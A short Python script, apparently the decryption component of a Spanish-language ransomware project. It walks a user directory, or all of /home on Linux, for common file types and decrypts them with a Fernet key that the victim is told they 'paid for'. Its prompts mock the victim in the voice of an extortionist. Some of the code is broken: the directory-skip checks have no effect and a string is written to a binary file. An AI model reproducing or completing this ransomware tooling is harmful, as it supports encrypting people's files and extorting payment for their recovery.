from cryptography.fernet import Fernet
import os
import platform
import requests
from datetime import datetime
from tkinter import messagebox

user = os.getlogin()
Windows_dir = f'C:\\Users\\User\\OneDrive - INTEC\\Escritorio\\carpeta_totalmente_normal\\'
Linux_dir = '/home/'
plataforma = platform.system()
fecha = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

extensiones = 'rar','php','jpg','png','mp3','mp4','zip','rar','cs','txt','docx','webp','bat','iso','gif','jpeg','psd','pdf','sh','py' 

def dir_finder(dir_inicio):
        for dirpath, dirs, files in os.walk(dir_inicio):

            if("$Recycle.Bin" in dirpath):pass                         # Skip Junks
            elif("c:\\Windows" in dirpath):pass                        # Skip c:\\Windows
            elif("\\AppData\\" in dirpath):pass                        # Skip \AppData\
            elif("System32" in dirpath):pass  
            
            for i in files:
                absolute_dir = os.path.abspath(os.path.join(dirpath, i))
                ext = absolute_dir.split('.')[-1]
                if ext in extensiones:
                    yield absolute_dir

def generar_key():
    llave = input(f'ingresa tu llave {user} -->')
    with open('llave.key', 'wb') as llave_file:
        llave_file.write(llave)
    with open('llave.key','rb') as llave_maestra:
        llave_maestra.read()

def decrypt():   
    #identifica el sistema operativo y asigna el directorio que el corresponde 
    if (plataforma == 'Windows'):
        x = dir_finder(Windows_dir)
    elif (plataforma == 'Linux' or plataforma == 'Darwin'):
        x = dir_finder(Linux_dir)
    else:
        messagebox.showerror(title='Error de compatibilidad',message='Te me salvaste... digo\nTu host no es compatible con este amigable programa')
        exit

    llave = input(f'ingresa la llave por la que pagaste, palomo... digo {user} -->')
    e = Fernet(llave)
    
    for i in x:
        with open(i, 'rb') as file:
            file_data = file.read()
        decrypted = e.decrypt(file_data)
        with open(i, 'wb') as file:
            file.write(decrypted) 
    

if __name__ == '__main__':
    decrypt()